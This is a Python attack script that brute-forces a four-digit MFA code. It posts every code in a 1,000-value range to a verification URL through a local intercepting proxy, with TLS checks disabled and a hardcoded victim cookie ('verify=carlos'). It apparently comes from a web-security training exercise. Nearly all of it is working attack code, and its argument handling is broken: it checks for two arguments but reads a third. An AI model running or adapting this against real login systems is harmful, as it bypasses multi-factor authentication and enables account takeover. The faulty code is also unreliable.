import requests
import sys
import urllib3
import urllib
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}

def brute_force_mfa(url,start, end):    
    for i in range(start, end):
        print('{0:04}'.format(i))
        headers = {"Cookie": "verify=carlos; session=h7WEzdbDcLXsyf0pRNsvnH1IfNkrGv0j"}
        data = {"mfa-code": '{0:04}'.format(i)}
        r = requests.post(url, verify=False, proxies=proxies, data=data, headers=headers)
        res = r.text
        if 'Incorrect' not in res:
            print("(+) MFA code is %s" % '{0:04}'.format(i))
            return '{0:04}'.format(i)
            # if 'Invalid username' not in res:
            #     logs = "(+) Valid username found %s" % username.strip('\n')
            #     sys.stdout.write('\r' + logs)
            #     sys.stdout.flush()
            #     find_password(url, username.strip('\n'))
            #     break


def main():
	if len(sys.argv) != 2:
		print("(-) usage %s <url>" % sys.argv[0])
		print("(-) Example: %s www.example.com" % sys.argv[1])

	url = sys.argv[1]
	print(sys.argv[2])
	print("(+) Brute force MFA code")
	# password_length = sql_password_length(url)
	brute_force_mfa(url, int(sys.argv[2]), int(sys.argv[2]) + 1000)
	
	
if __name__ == "__main__":
	main()